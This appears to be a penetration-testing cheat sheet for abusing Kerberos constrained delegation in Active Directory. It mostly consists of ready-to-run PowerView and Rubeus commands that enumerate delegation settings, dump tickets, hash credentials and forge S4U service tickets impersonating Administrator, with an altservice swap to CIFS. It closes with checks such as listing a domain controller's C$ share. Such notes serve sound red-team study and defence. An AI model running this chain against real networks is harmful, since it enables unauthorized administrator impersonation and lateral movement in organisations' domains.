# Constrained Delegation

## Enumeration
```powershell
# Get computer Constrained Delegation
Get-DomainComputer -TrustedToAuth| Select DnsHostName, UserAccountControl, msds-allowedtodelegateto | FL

# Get user Constrained Delegation
Get-DomainUser -TrustedToAuth
```
## Obtain ticket for compromised account with Constrained Delegation
- This step not required if we have a RC4 or AES256 hash for the account
- If you have a plaintext password for the account, we can simply hash it with Rubeus

```powershell
# Do this if you only have a password of the constrained delegation account
Invoke-Rubeus -Command "hash /username:user /password:password /domain:security.local"
```

```powershell
# If the constrained delegation account is a machine account
# and you do not already have credential material for it
Invoke-Rubeus -Command "triage"
Invoke-Rubeus -Command "dump /nowrap /luid:[LUID] /service:[krbtgt] /user:[Hostname] /nowrap"
```

## Obtain a TGS
In this part of the attack chain we are aiming to utilize the constrained delegation accounts `msds-allowedtodelegateto` value to generate a service ticket for which another user can access those SPNs.

### Caveats
If the value in `msds-allowedtodelegateto` ends in a specified port number such as `mssqlsvc/cdc01.prod.corp1.com:1433` then it is not possible to make use of `/altservice` as when changing the flag to CIFS for example, would ultimately render the value to `cifs/cdc01.prod.corp1.com:1433` which of course, SMB is not valid over port 1433.

It is not possible to impersonate users who are a member of the group `Protected Users` or who have the flag `The Account is sensitive and cannot be delegated setting` enabled.

## Scenario 1: Same Service

- The user IISsvc is configued for constrained delegation (`TRUSTED_TO_AUTH_FOR_DELEGATION`)
- The user IISSvc has a SPN set to `mssqlsvc/cdc01.prod.corp1.com:1433`
- We can change the sname value in the service ticket to instead create a TGS for the administrator to access `mssqlsvc/cdc01.prod.corp1.com:1433`.
- Once the ticket is geneated, we inject it into the current session


```powershell
# Using a TGT for IISsvc to request a TGS for the SPN mssql/dc01.security.local and impersonate a privileged user
Invoke-Rubeus -Command "s4u /impersonateuser:Administrator /user:IISsvc /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ticket:[Base64 ticket] /nowrap"

# Option 2
# If we know the RC4 or AES256 hash of the compromised account with delegation configured already
Invoke-Rubeus -Command "s4u /impersonateuser:administrator /user:iissvc /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt"

# Validate
.\SQLRecon.exe /a:WinToken /h:cdc01.prod.corp1.com /m:whoami
```

## Scenario 2: Alternate Service
- The user IISsvc is configued for constrained delegation (`TRUSTED_TO_AUTH_FOR_DELEGATION`)
- The user IISSvc has a SPN set to `http/cdc01.prod.corp1.com`
- We can change the sname value in the service ticket to instead create a TGS for the administrator to access `cifs/cdc01.prod.corp1.com`.
- Once the ticket is geneated, we inject it into the current session
```powershell
# Using a TGT for IISsvc to request a TGS for the SPN mssql/dc01.security.local and impersonate a privileged user
Invoke-Rubeus -Command "s4u /impersonateuser:administrator /user:iissvc /ticket:[Base64 Ticket] /msdsspn:http/cdc01.prod.corp1.com /ptt /altservice:cifs"

# Option 2
# If we know the RC4 or AES256 hash of the compromised account with delegation configured already
Invoke-Rubeus -Command "s4u /impersonateuser:administrator /user:iissvc /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /msdsspn:http/cdc01.prod.corp1.com /ptt /altservice:cifs"

# Validate
dir \\cdc01.prod.corp1.com\c$
```
### Note
It is possible to specify multiple alternative services within a single command
```powershell
/altservice:cifs,http,host,ldap,wsman,rpcss,mssql
```




